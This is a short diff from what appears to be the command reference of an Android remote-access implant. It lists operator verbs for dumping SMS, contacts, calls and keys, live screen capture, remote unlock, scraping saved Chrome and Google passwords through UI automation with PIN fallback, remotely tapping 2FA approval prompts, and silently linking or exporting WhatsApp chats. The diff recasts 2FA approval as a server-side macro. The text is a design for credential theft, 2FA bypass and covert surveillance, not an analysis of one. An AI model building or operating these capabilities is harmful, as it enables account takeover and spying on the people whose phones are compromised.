@@ -71,7 +71,9 @@ sms recent/dump/send; contacts; calls dump; keys dump; screen
 live/shot/record/start/stop; tap; type; key; unlock/lock;
 passwords dump (Chrome + Google Password Manager via UI automation: open entry,
 tap eye, PIN fallback auth, read off screen, repeat; outputs JSON);
-auth approve (tap 2FA/confirmation prompts on device remotely); wa link
+auth approve = SERVER-SIDE MACRO, not a client verb: just "ui dump → find the
+confirm button → tap" driven from the operator/CLI (no hardcoded client code);
+wa link
 (WhatsApp linked-devices via phone-number code, no QR); wa dump
 [--contact "<name>" | --all] (UI automation of WhatsApp's own
 Export chat incl. media, per contact or every chat; contact picked by
